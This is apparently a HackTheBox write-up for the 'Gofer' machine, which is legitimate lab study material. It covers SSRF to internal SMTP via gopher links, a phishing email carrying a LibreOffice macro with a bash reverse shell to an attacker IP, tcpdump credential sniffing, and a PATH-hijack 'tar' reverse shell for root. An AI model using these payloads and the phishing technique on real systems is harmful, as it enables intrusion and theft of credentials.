<center><strong><font color="DarkGray"><a href="https://app.hackthebox.com/machines/Gofer" target="_blank"><er>Gofer</er></a> is a vulnerable machine on HackTheBox. It features an HTTP server running a virtual host with an SSRF-vulnerable endpoint. Leveraging this vulnerability, I sent a spear-phishing email with gopher links, containing a malicious .odt file with a Macro that triggers a reverse shell script. The target, "jhudson", often clicks links without scrutiny, allowing us to gain a foothold when the .odt file is opened. After gaining access as "jhudson", I captured "tbuckley's" credentials using network sniffing. Then, I exploited the binary "/usr/local/bin/notes" by manipulating the "tar" command, eventually gaining root access on the machine.</font></strong></center>

From: jdavis@gofer.htb

Hello guys,

Our dear Jocelyn received another phishing attempt last week and his habit of clicking on links without paying much attention may be problematic one day. That's why from now on, I've decided that important documents will only be sent internally, by mail, which should greatly limit the risks. If possible, use an .odt format, as documents saved in Office Word are not always well interpreted by Libreoffice.

PS: Last thing for Tom; I know you're working on our web proxy but if you could restrict access, it will be more secure until you have finished it. It seems to me that it should be possible to do so via <Limit>
```

* In this email, `jdavis@gofer.htb`, the *CEO* of *Gofer*, is informing the recipients, that there was a recent phishing attempt targeting `Jocelyn`, *Product Manager*. To enhance security, the CEO has decided that important documents will now only be shared internally through email and recommends using `.odt format` instead of Office Word documents to ensure compatibility with `LibreOffice`.
* Additionally, there's a postscript (PS) message directed at Tom, asking him to restrict access on the web proxy for enhanced security.
<br/>

There are two important things we can deduce from this mail: <br/>
* There is a web proxy in production that needs some protection (Restriction Access)
*  Jocelyn is susceptible to phishing due to a habit of clicking on links without much attention.
* There is an internal mail service (SMTP Postfix) for sending internal emails, and for compatibility with LibreOffice, it is recommended that documents be in the `.odt` format.

Before navigating to http://proxy.gofer.htb/, let's add the new virtual host into our `/etc/hosts` file, as displayed below: <br/>

```bash
$ echo '10.10.11.225  gofer.htb proxy.gofer.htb' >> /etc/hosts
```

When navigating to http://proxy.gofer.htb in the browser, I encountered a **Basic Authentication** mechanism. A valid username and password are required to access the content hosted on this virtual host. <br/>

    * FUZZ: index.php
```

* Using `cURL` to send a POST request to this endpoint, we get the message '*Missing URL parameter*', as can be shown below. This means that we need to send a POST parameter *probably* named `url` with some data in order for this endpoint to work as intended.

```bash
curl -X POST http://proxy.gofer.htb/index.php
<!-- Welcome to Gofer proxy -->
<html><body>Missing URL parameter !</body></html>
```

### **<strong><font color="DarkKhaki">Interacting with index.php</font></strong>**

At first, I tried placing the `url` parameter in the body of the request and still got the same error and then I tried to pass it in the URL `index.php?url=` and it worked, which is weird because we are sending the requests using POST method and not GET !! <br/>

I tried sending `http://localhost` as a value to the `url` parameter, but apparently the word '`localhost`' is blacklisted. <br/>

```bash
curl -X POST 'http://proxy.gofer.htb/index.php?url=http://localhost'
<!-- Welcome to Gofer proxy -->
<html><body>Blacklisted keyword: localhost !</body></html>
```

However, sending `127.0.0.1` as a value to the `url` parameter, will workes just fine and will return the HTML source code of the main page at http://gofer.htb: <br/>

```bash
curl -X POST 'http://proxy.gofer.htb/index.php?url=127.0.0.1'
<!DOCTYPE html>   
<html lang="en">

[...snip...]
```

With this in mind, we can safely assume that the `url` parameter is vulnerable to Server-Side Request Forgery vulnerability.

### **<strong><font color="DarkKhaki">SSRF Detection</font></strong>**

To confirm the vulnerability, I started a simple HTTP server using python3 and tried to send a request to my web server and I received the request successfully from the target machine, which confirms the presence of the vulnerability: <br/>

```bash
$ curl -X POST http://proxy.gofer.htb/index.php?url=http://tun0-IP/
```

<br/>



### **<strong><font color="DarkKhaki">Internal SMTP Service</font></strong>**

Since the web server is vulnerable to SSRF, we can leverage this vulnerability to interact with the internal SMTP service and maybe send a spear-phishing email to `Jocely Hudson`, who is susceptible to phishing attacks and always clicks on links without much attention. <br/>

## **<strong><font color="DarkCyan">Exploitation</font></strong>**
### **<strong><font color="DarkKhaki">Exploitation plan</font></strong>**

The exploitation plan is as follows: <br/>
1. To begin, we will create a `.odt` file, essentially an OpenDocument text file, containing a malicious Macro that will run a reverse shell script when executed and eventually grant us a foothold on the target machine.
2. After creating this ``.odt`` file, we need to send the link to this file by mail using SMTP service. However, since this SMTP service is only running internally, we will leverage the SSRF vulnerability and make the web server send the mail in our behalf.
3. Upon receiving the email with the link to the malicious `.odt` file, we anticipate that Jocelyn will click on the link and open the file. This action will trigger the macro, resulting in a reverse shell connection, effectively granting us access to the target system as Jocelyn.

### **<strong><font color="DarkKhaki">Creating an ODT file using LibreOffice</font></strong>**

The initial step in the attack chain is to create an OpenDocument Text file using 'LibreOffice Writer' with a malicious macro designed to execute a reverse shell script on the target system, providing us with a remote shell. <br/>
I drew inspiration from this [article](https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html), which provides insights on performing a similar attack. <br/>

Here are the steps: <br/>

**1-** Launch LibreOffice Writer, write down whatever you want and save the file with a .odt extension (This is required as mentioned in the mail by ``jdavis``) <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-gofer/2023-08-01 13_36_36-KaliLinuxOS - VMware Workstation 17 Player (Non-commercial use only) 1.png">
<center><i></i></center>
<br/>


**2-** Navigate to `Tools` > `Macros` > `Organize Macros` and click on `Basic`: <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-gofer/2023-08-01 13_38_18-KaliLinuxOS - VMware Workstation 17 Player (Non-commercial use only).png">
<center><i></i></center>
<br/>

**3-** Clicking on '**Basic**' will open the '**BASIC Macros**' window, allowing you to add a new macro. In this window, select the filename and click on '**New**'. You can choose any name for it and then click '**Ok**': <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-gofer/2023-08-01 13_45_38-KaliLinuxOS - VMware Workstation 17 Player (Non-commercial use only).png">
<center><i></i></center>
<br/>

**4-** The '**Object Catalog**' should open with your new macro selected and ready for editing. Replace all the sample text in the macro with the following: <br/>

```bash
Sub evil

    Shell("bash -c 'bash -i >& /dev/tcp/tun0-IP/9999 0>&1'")
    
End Sub
```

> *Make sure to change 'tun0-IP' with your tun0 interface IP address !!*

<center><i></i></center>
<br/>

> *After editing the macro, press '`Ctrl + S`' to save your changes.*

**5-** After completing these steps, close the window. Then, reopen the Macro creation window by navigating to '`Tools`' > '`Macros`' > '`Organize Macros`' > '`Basic`'. Once there, select your macro and click '`Assign...`' <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-gofer/2023-08-01 13_49_27-KaliLinuxOS - VMware Workstation 17 Player (Non-commercial use only).png">
<center><i></i></center>
<br/>

**6-** After clicking '`Assign...`', the '**Customize**' window should open. Select the '`Events`' tab, choose '`Open Document`' in the '`Event`' column, and then click '`Macro...`' <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-gofer/2023-08-01 13_52_18-KaliLinuxOS - VMware Workstation 17 Player (Non-commercial use only).png">
<center><i></i></center>
<br/>

**7-** After clicking '`Macro...`', the '**Macro Selector**' window should open. Find your macro and click '`Ok`' <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-gofer/2023-08-01 13_55_28-KaliLinuxOS - VMware Workstation 17 Player (Non-commercial use only).png">
<center><i></i></center>
<br/>

**8-** If you've followed all the steps correctly, the `Event` tab should display something like this: <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-gofer/2023-08-01 13_56_43-KaliLinuxOS - VMware Workstation 17 Player (Non-commercial use only).png">
<center><i></i></center>
<br/>

**9-** Finally, click '`Ok`' > '`Close`' and then press '`Ctrl + S`' to save your `.odt` file, which is now ready to be sent to '`Jocelyn`'. <br/>

### **<strong><font color="DarkKhaki">Sending the file using Gopher links</font></strong>**

Because we can't send an email directly using `SMTP`, as it's limited to internal use, we'll leverage the SSRF vulnerability in the `proxy` virtual host. <br/>
The issue is that there is no SMTP scheme like '`smtp://`' available for sending emails directly from the vulnerable '`url`' parameter. Instead, we'll use 'gopher://' as an alternative. <br/>
**Gopher** was an early competitor to **HTTP**, designed for distributing, searching, and retrieving documents in Internet protocol networks. <br/>

> *For more information, refer to this [link](https://en.wikipedia.org/wiki/Gopher_(protocol))*


To [generate](https://infosecwriteups.com/server-side-request-forgery-to-internal-smtp-access-dea16fe37ed2) such a link, I created a PHP script to convert SMTP commands into a gopher link: <br/>

```php
<?php
        $commands = array(
                "MAIL FROM: <root@gofer.htb>",
                "RCPT TO: <jhudson@gofer.htb>",
                "DATA",
                "Subject: Important mail",
                "Click on this link: http://10.10.14.20/phish.odt for more info", // Replace the IP address with your 'tun0' IP address.
                "."
        );
$payload = implode('%0A', $commands); 
$encoded_payload = urlencode($payload);
echo 'curl -X POST http://proxy.gofer.htb/index.php?url=gopher://2130706433:25/_' . $encoded_payload;

?>
```

> You can find the source code [here](https://github.com/YounesTasra-R4z3rSw0rd/CTF-Scripts/blob/main/HTB/Gofer/gopher-generator.php)

* Let's run this script:

```bash
$ php gopher-generator.php

curl -X POST http://proxy.gofer.htb/index.php?url=gopher://2130706433:25/_MAIL+FROM%3A+%3Croot%40gofer.htb%3E%250ARCPT+TO%3A+%3Cjhudson%40gofer.htb%3E%250ADATA%250ASubject%3A+Important+mail%250AClick+on+this+link%3A+http%3A%2F%2F10.10.14.20%2Fphish.odt+for+more+info%250A.
```

* As can be seen from the output, the script generates a `cURL` command that, when executed, exploits the SSRF vulnerability in the '`url`' parameter to send an email directly to '`jocelyn`', including a link to our crafted `phish.odt` file.

## **<strong><font color="DarkCyan">Shell as jhudson</font></strong>**
### **<strong><font color="DarkKhaki">Serving and sending</font></strong>**

Now, simply start an HTTP server using Python to serve our malicious `.odt` file and initiate our command and control (C2) by running a netcat listener on the port specified in the reverse shell script within the Macro. <br/>

**1-** Start a python webserver on port **80** <br/>

```bash
python3 -m http.server 80
```

**2-** Start a netcat listener on port **9999**: <br/>

```bash
nc -nlvp 9999
```

* The target machine is running Linux version **5.10.0**:
```bash
jhudson@gofer:~$ uname -a
Linux version 5.10.0-23-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6)

```

* There is an interesting binary with an SUID bit set. However, `jhudson` does not have privileges to run it. Only the root user and members of the group `dev` can interact with the binary:

```bash
jhudson@gofer:~$ find / -type f -perm -04000 -ls 2>/dev/null
<...SNIP...>

-rwsr-s--- 1 root dev 17K Apr 28 16:06 /usr/local/bin/notes
```

* The `.htpasswd` file, found in the `/etc/apache2/` directory, stores the password hash for the user `tbuckley`. However, my attempts to crack it using the '`rockyou.txt`' wordlist were unsuccessful.

```bash
$ cat /etc/apache2/.htpasswd
tbuckley:$apr1$YcZb9OIz$fRzQMx20VskXgmH65jjLh/
```

### **<strong><font color="DarkKhaki">Enumeration with Linpeas</font></strong>**

Running **Linpeas** on the target system revealed an interesting detail: the user '`jhduson`' (*me, basically*) has the ability to sniff the network using '`tcpdump`' <br/>

```bash
<...SNIP...>

╔══════════╣ Can I sniff with tcpdump?
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sniffing
You can sniff with tcpdump!

<...SNIP...>
```

### **<strong><font color="DarkKhaki">Monitoring processes using pspy64</font></strong>**


Running [pspy](https://github.com/DominicBreuker/pspy) on the target system, I noticed that **2 scripts** are executed every minute with root privileges. <br/>

```bash
<...SNIP...>

2023/08/01 21:34:01 CMD: UID=0     PID=71047  | /bin/bash /root/scripts/curl.sh 
2023/08/01 21:34:01 CMD: UID=0     PID=71048  | /bin/bash /root/scripts/mail.sh 

<...SNIP...>

2023/08/01 21:35:01 CMD: UID=0     PID=71092  | /bin/bash /root/scripts/curl.sh
2023/08/01 21:35:01 CMD: UID=0     PID=71048  | /bin/bash /root/scripts/mail.sh 

<...SNIP...>
```

The `curl.sh` script appears interesting, possibly executing `curl` command for sending HTTP requests. Given `jhudson`'s network sniffing capabilities with '`tcpdump`' we can monitor the traffic generated by the execution of these scripts. <br/>

## **<strong><font color="DarkCyan">Shell as tbuckley</font></strong>**
### **<strong><font color="DarkKhaki">Sniffing with tcpdump</font></strong>**

**1-** Let's run `tcpdump`, to start sniffing while saving the captured packets on `capture.pcap` file: <br/>

```bash
jhudson@gofer:~$ tcpdump -i any 'not port 22' -w capture.pcap 
```

* '**not port 22**' tells tcpdump to ignore SSH traffic (We are only interested on the traffic generated upon the execution of `mail.sh` and `curl.sh`)

**2-** Wait for the cronjob to execute (1-2 minutes), and then press '`Ctrl + C`' to interrupt the sniffing. <br/>

**3-** Start an HTTP server on the target machine serving the `capture.pcap` file. <br/>

```bash
jhudson@gofer:~$ python3 -m http.server 1234 
```

**4-** On the attacking machine, download the pcap file and open it using **Wireshark**. <br/>
**5-** After analyzing the HTTP traffic, I discovered a POST request sent to http://proxy.gofer.htb, with the **Authorization** header containing credentials encoded in base64. <br/>

<center><i>Authorization Header</i></center>
<br/>

### **<strong><font color="DarkKhaki">tbuckley credentials</font></strong>**

* The **Authorization** header contains `tbuckley`'s credentials, as can be seen below:

```bash
echo 'dGJ1Y2tsZXk6b29QNGRpZXRpZTNvX2hxdWFldGk=' | base64 --decode
tbuckley:ooP4dietie3o_hquaeti
```

> **NOTE**: *You can also get `tbuckley`'s credentials by simply monitoring processes using [pspy64](https://github.com/DominicBreuker/pspy)*

# **<strong><font color="Brown">Privilege Escalation</font></strong>**

***
## **<strong><font color="DarkCyan">Shell as root</font></strong>**
### **<strong><font color="DarkKhaki">/usr/local/bin/notes</font></strong>**

The user `tbuckley` is a member of the group `dev`, which means he can interact with the binary `/usr/local/bin/notes` that has an SUID bit set. This binary is a **note taking** application with 8 functionalities/features:

1. Create a user and choose a username
2. Show user information (username + Role *admin/user*)
3. Delete a user
4. Write a note
5. Show the note
6. Save the note (*Not yet implemented*)
7. Delete the note
8. Backup the note

To better understand what happens behind the scenes when a user interacts with these functionalities, I'll start a Python web server to serve the '`notes`' binary on the target machine. I will then download the binary to my local machine for reverse engineering using '`Ghidra`'.

* On the target machine:

```bash
tbuckley@gofer:~$ cd /usr/local/bin
tbuckley@gofer:~$ python3 -m http.server 1234
```

* On the local (Attacking) machine:

```bash
$ wget http://gofer.htb:1234/notes
```

### **<strong><font color="DarkKhaki">Analyzing the binary with Ghidra</font></strong>**

After opening the binary with `Ghidra` I analyzed the `main` function and found the following: <br/>

1. If a user hasn't been created since the application launch, you cannot delete a user. However, if you've created a user, you can delete it. <br/>
2. The backup functionality is only available for admin users (those with the '`admin`' role). <br/>
3. Case number 8 looks interesting. It checks if the user has 'admin' privileges. If it's the case, it will create a compressed tar archive of the contents of the `/opt/notes` directory and stores it as `/root/backups/backup_notes.tar.gz`, by running the command `tar -czvf /root/backups/backup_notes.tar.gz /opt/notes` <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-gofer/2023-08-02 02_13_45-KaliLinuxOS - VMware Workstation 17 Player (Non-commercial use only).png">
<center><i>Case 8</i></center>
<br/>

* The implementation of this `tar` command is not safe. A user can easily create a Bash script named '**tar**' containing a reverse shell payload, move that script to a directory listed in the **$PATH** environment variable, and then execute the `tar` command with root privileges by selecting choice number **8**, which can lead to obtaining a root shell.
* A safer implementation is to use an **absolute path** instead of relative paths, like `/usr/bin/tar -czvf /root/backups/backup_notes.tar.gz /opt/notes`

* With that in mind, all we need to do is to find a way to become '`admin`' and then leverage this unsafe implementation to achieve root access on the box.

### **<strong><font color="DarkKhaki">Becoming admin</font></strong>**

**1-** While testing the application, I observed an odd behavior. When a user is created and subsequently deleted, only the username is removed, while the role remains intact. <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-gofer/2023-10-27 22_33_50-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png">

<center><i>Delete the user + Show user information</i></center>
<br/>

**2-** After this step, if you create a note via the **4th** option, the note's first word before a whitespace will be written in the '**Username**' field, and the '**Role**' field will be cleared. <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-gofer/2023-10-27 22_42_56-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png">

<center><i>Show user information</i></center>
<br/>

**3-** With this in mind and after some analysis of the condition that checks if a user is an admin, I identified the following code:

```c
iVar1 = strcmp((char *)((long)username + 0x18), "admin");
```

* This code uses the `strcmp()` function to compare the string located at the address `(char *)((long)username + 0x18)`, which is a `24-byte` offset from the username pointer, with the string '`admin`'
* In other words, the `strcmp()` function begins reading the first string (the one in the first argument) after a 24-byte offset. This means we can create a note with **24 random characters** and append the string '`admin`' to bypass this check.

### **<strong><font color="DarkKhaki">Exploitation</font></strong>**

Here are the exploitation steps:
1. Create a user with any desired name, by selecting the option **n°1**
2. Delete this user by choosing the option **n°2**
3. Write a note with **24** random characters followed by the string `admin`. (*e.g. `bbbbbbbbbbbbbbbbbbbbbbbbadmin`*)
4. Check the new role by choosing the option **n°2**

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-gofer/2023-08-02 02_34_30-KaliLinuxOS - VMware Workstation 17 Player (Non-commercial use only).png">
<center><i>Admin Role</i></center>
<br/>

* As can be seen in the screenshot above, we have the '**admin**' role !!

### **<strong><font color="DarkKhaki">PrivEsc using PATH variable</font></strong>**

At this point, we simply need to create a Bash script and name it '**tar**'. Here's the content of the file: <br/>

```bash
#!/usr/bin/bash
/usr/bin/bash -c 'bash -i >& /dev/tcp/tun0-IP/9997 0>&1'
```

> *Make sure to replace 'tun0-IP' with your tun0 IP address*


I'll save this file in the `/tmp` directory and prepend it to the `$PATH` environment variable using the following command: <br/>

```bash
tbuckley@gofer:/tmp$ export PATH=/tmp:$PATH
```

* Checking if `/tmp` has been added to the `$PATH`:

```bash
tbuckley@gofer:/tmp$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

tbuckley@gofer:/tmp$ which tar
/tmp/tar
```

Next, we'll start a netcat listener on port **9997** and trigger the backup script by choosing option **n°8**. This will execute our '**tar**' script instead of the expected binary `/usr/bin/tar`.

# **<strong><font color="Brown">Attack Chain</font></strong>**

1. Nmap found **3** open ports: 
    * Port 22 running an SSH service, 
    * Port **80** running an HTTP service, 
    * Ports **139,445** running SAMBA,
    * Filtered port **25** running an SMTP service,
2. After some enumeration on the exposed HTTP service, I found a virtual host running on `proxy.gofer.htb`, which is protected with a Basic Authentication mechanism. A user is required to enter valid username and password in order to access the service. However, the endpoint `/index.php` can be accessed using POST request without submitting providing legitimate credentials. This endpoint has a query string named `url` (`/index.php?url=`), which is vulnerable to SSRF.
3. Enumerating SMB, there is a file located at `/shares/.backup/mail`, which contains an email sent from the CEO of `Gofer` to its employees (`jhudson` and `tbuckley`). The email implies that `jhudson` has a bad habit of clicking on links without verifying if they are not malicious, which means an attacker could target `jhudson`, to make her click on malicious links. The email also mentions the use of `.odt` files in order to send document files.
4. With that in mind, an attacker could craft a malicious `.odt` file, which is basically a word document file created by `LibreOffice`.  This file could contain a malicious macro with a reverse shell payload, granting the attacker a shell upon opening the document and executing the macro.
5. The next step, is to send a mail exclusively to `jhudon`. This mail should contain the link to the malicious `.odt` file. To do so, since the SMTP service is only serving internally, we can leverage the SSRF vulnerability and make the web service send the mail on our behalf using `gopher://` protocol.
6. To do so, I created a [PHP script](https://github.com/YounesTasra-R4z3rSw0rd/CTF-Scripts/blob/main/HTB/Gofer/gopher-generator.php) that generates a gopher link based on the SMTP commands passed into it. The generated link can be used to send an email to 'jhudson' which includes a link to the malicious .odt file. After setting up a netcat listener, a shell should be received when 'jhudson' acquires the .odt file and executes the macro.
7. Once in as `jhudson`, this user has the privileges to sniff on the network using `tcpdump`. Additionaly a script called `curl.sh` is executed every minute with root privileges. Therefore, I started network sniffing on all interfaces, saved the traffic in a pcap file, and analyzed it locally with Wireshark. In the captured data, I found `tbuckley`'s credentials, which were base64-encoded and sent in the 'Authorization' header."
9. As `tbuckley`, I have access to the binary `/usr/local/bin/notes`, which is a note-taking application with various functionalities, including user management, note creation, saving notes, and note backup (restricted to admin users)
10.  During the reverse engineering process of the binary, I found that when a user chooses the backup feature, a system command, `tar -czvf ...`' is executed without an absolute path. This means an attacker could create a bash script named '`tar`', add its location to the beginning of '`$PATH`' and execute it.
11. After some experimentation with the application, I attained the `admin` role and created a reverse shell script named '`tar`' Finally, when selecting the backup feature, I obtained a root shell on the box.
